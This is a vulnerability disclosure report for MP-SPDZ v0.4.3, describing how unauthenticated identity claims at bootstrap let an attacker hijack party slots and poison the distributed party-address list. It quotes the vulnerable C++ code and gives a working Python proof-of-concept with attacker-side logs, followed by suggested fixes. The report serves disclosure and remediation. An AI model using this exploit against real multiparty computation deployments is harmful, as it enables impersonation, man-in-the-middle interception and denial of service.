# MP-SPDZ v0.4.3: Unauthenticated Party Identity Claim Allows Connection-Slot Hijacking and Party-List Poisoning

- **Vulnerability type**: Missing Authentication for Critical Function (CWE-306)
- **Affected product**: MP-SPDZ v0.4.3
- **Affected components**: coordination/bootstrap protocol — standalone `Server.x`, the embedded
  coordination server of party 0 (`-h` mode), and the party-to-party `PlainPlayer` handshake
  (`Networking/ServerSocket.cpp`, `Networking/Player.cpp`, `Networking/Server.cpp`)
- **Severity**: High (CVSS 3.1 estimate: 8.1 — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Summary

During bootstrap, every party claims its identity by sending a **self-declared, predictable
string** (e.g. `"machineP1"` or `"P1"`) over an unauthenticated TCP connection. The server
registers whichever client claims an identity **first**, with no credential, certificate, or
source validation. An attacker who connects before an honest party occupies that party's slot
for the entire computation, and can additionally poison the distributed party-address list with
attacker-controlled ports.

## Root Cause

```cpp
// Networking/Player.cpp:321-328 — the "authentication" is a self-declared id string
auto pn = id_base + "P" + to_string(player_no);   // e.g. "machineP1", fully predictable
...
octetStream(pn).Send(sockets[i]);
```

```cpp
// Networking/ServerSocket.cpp:183-193
void ServerSocket::process_connection(int consocket, const string& client_id) {
  data_signal.lock();
  process_client(client_id);                     // default: no-op (ServerSocket.h:33)
  clients[client_id] = consocket;                // line 191: unconditional, no checks
  data_signal.broadcast();
  data_signal.unlock();
}
```

```cpp
// Networking/Server.cpp:38-53, 55-69
// Server::get_name trusts the port number reported by the client;
// Server::send_names distributes the (poisoned) names/ports list to every party.
```

`get_connection_socket()` (ServerSocket.cpp:196-218) only rejects ids already marked `used`;
the first claimant's socket is returned as the channel to that party. The same claim flow is
used by the standalone coordination server (`Server::start`, Networking/Server.cpp:120-122)
and by the party-to-party `PlainPlayer` setup (`Networking/Player.cpp:295-353`).

## Attack Preconditions

- The attacker can open a TCP connection to the coordination port (default configuration has no
  authentication on it), and connects before the honest party it wants to impersonate (race, or
  simply earlier startup).

## Impact

- **Party impersonation**: the attacker occupies the victim party's identity for the whole
  computation; all peers treat the attacker as that party.
- **Party-list poisoning**: the attacker's self-reported port is embedded in the official
  names/ports list; honest parties then dial attacker-controlled endpoints for their P2P MPC
  channels (verified end-to-end below).
- **Denial of service**: honest parties that arrive later cannot join (timeout / discarded
  connections). With `--encrypted`, the TLS handshake fails after the slot is taken, still
  reliably aborting the run.
- Chained with report 01 (default plaintext), this is a full MITM of the entire MPC.

## Proof of Concept (dynamically verified)

### PoC 2-A: hijack all identity slots on `Server.x`

Attack script (frame format = 4-byte little-endian length + payload, the `octetStream` wire
format):

```python
for claim in (b"P0", b"P1"):
    s = socket.create_connection(("127.0.0.1", 18000))
    s.sendall(struct.pack("<I", len(claim)) + claim)   # claim identity, no authentication
    socks.append(s)
# when the server asks "the party" for its name/port (Server::get_name):
s.sendall(frame(b""))                      # legacy name field (unused)
s.sendall(struct.pack("<I", 9999))         # attacker-controlled port
```

Observed attacker-side log:

```
[+] claimed identity P0 on fd=3
[+] claimed identity P1 on fd=4
[+] socket 0: answered get_name with port 9999
[+] socket 1: answered get_name with port 10000
[+] socket 0 received names/ports list (58 bytes):
    b"...127.0.0.1...127.0.0.1...\x0f\x27\x00\x00\x10\x27\x00\x00"
[+] attacker now holds BOTH party identities; honest parties cannot join.
```

`\x0f\x27` = 0x270f = 9999 (little-endian): the attacker-reported ports were accepted into the
official party list and the list was distributed as if all parties had checked in.

### PoC 2-B: end-to-end redirect of a REAL party

1. Attacker claims only `"P1"` and listens on port 9999.
2. A real `mascot-party.x` party 0 starts normally (embedded coordination server).

Observed:

```
[*] evil 'P1' listening on port 9999
[+] claimed identity 'P1' on coordination server
[+] reported attacker-controlled port 9999 as P1's listen port
[+] server distributed party list to attacker: b'...127.0.0.1...PF\x00\x00\x0f\x27\x00\x00'
```

(`PF\x00\x00` = 0x4650 = 18000 is P0's real port; `\x0f\x27` = 9999 is the attacker's.)

The real party 0 then initiates its P2P MPC connection to `127.0.0.1:9999` — the attacker's
listener — placing the attacker as its protocol peer. The real party hangs/times out because
the attacker does not speak the protocol; a fully-implemented attacker endpoint would complete
the impersonation.

## Static Verification

```bash
sed -n 183,193p Networking/ServerSocket.cpp    # unconditional clients[client_id] = consocket
sed -n 320,330p Networking/Player.cpp          # self-declared id frame
grep -n "process_client" Networking/ServerSocket.h   # default no-op
```

No call anywhere in the codebase authenticates `client_id`.

## Suggested Fix

- Authenticate the bootstrap handshake (HMAC over the claimed id with a pre-shared key, or
  perform the TLS handshake *before* slot assignment and key `clients[]` by certificate
  identity).
- Reject duplicate id claims instead of overwriting.
- Integrity-protect the distributed names/ports list and sanity-check its size.

## References

- MP-SPDZ repository: https://github.com/data61/MP-SPDZ
- MP-SPDZ networking documentation: https://mp-spdz.readthedocs.io/en/latest/networking.html

## Discoverer

*(to be filled by reporter)*
